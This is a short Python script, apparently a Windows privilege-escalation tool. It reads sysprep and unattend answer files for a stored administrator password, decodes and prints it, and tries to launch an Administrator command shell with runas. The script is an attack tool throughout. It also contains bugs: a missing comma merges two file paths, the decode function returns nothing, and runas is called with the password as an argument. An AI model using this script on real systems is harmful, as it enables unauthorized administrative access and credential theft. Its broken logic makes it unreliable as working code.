import os
import re
import base64
import subprocess

# Common file paths to find the password
file_paths = [
    "C:\\Windows\\System32\\sysprep\\sysprep.inf"
    "C:\\Windows\\Panther\\Autounattend.xml",
    "C:\\Windows\\Panther\\Unattend.xml",
]

# Pattern that match the password
pattern = re.compile(r"<AdministratorPassword>\s*<Value>(.*?)</Value>",
                     re.IGNORECASE)


def extract_password(file_path):
    """Extracts admin password."""
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            match = pattern.search(file.read())
            if match:
                return match.group(1)
    except Exception:
        pass

    return None


def decode_password(encoded_password):
    """Decode if the password is base64 encoded"""
    try:
        decoded_password = base64.b64decode(encoded_password).decode("utf-8")
        print(f"[+] Decoded Admin Password: {decoded_password}")
    except:
        decoded_password = encoded_password
        print(f"[+] Plaintext Admin Password: {decoded_password}")


def start_admin_session(password):
    """Start an admin session using 'runas'"""
    try:
        command = f'runas /user:Administrator "{password}" cmd.exe'
        subprocess.run(command, shell=True, check=True)
        print("[+] Admin session initiated.")
    except subprocess.CalledProcessError as e:
        print(f"[-] Failed to start admin session: {e}")


def main():

    admin_password = None
    for path in file_paths:
        if os.path.exists(path):
            admin_password = extract_password(path)
            if admin_password:
                print(f"[+] Password found in: {path}")
                decoded_password = decode_password(admin_password)
                start_admin_session(decoded_password)

    if not admin_password:
        print("[-] No administrator password found.")
        exit(1)


if __name__ == "__main__":
    main()
